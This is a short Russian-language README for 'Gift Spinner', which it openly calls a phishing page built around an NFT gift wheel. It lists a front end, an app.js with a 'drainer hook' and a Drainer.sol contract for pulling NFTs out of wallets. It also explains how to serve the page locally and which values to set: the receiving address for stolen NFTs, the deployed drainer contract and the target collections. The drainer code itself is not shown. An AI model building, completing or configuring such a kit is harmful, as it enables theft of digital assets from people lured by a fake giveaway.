# Gift Spinner

Фишинговая страница с крутилкой NFT-подарков.

## Файлы

- index.html — крутилка
- style.css — стили
- app.js — логика + drainer hook
- contracts/Drainer.sol — контракт для вывода NFT

## Запуск локально

Открой index.html в браузере или подними сервер:

    python -m http.server 8080

Затем открой http://localhost:8080

## Настройка

В app.js заполни:
- RECEIVER — адрес куда уходят NFT
- DRAINER_CONTRACT — адрес задеплоенного Drainer.sol
- TARGET_COLLECTIONS — список коллекций-целей
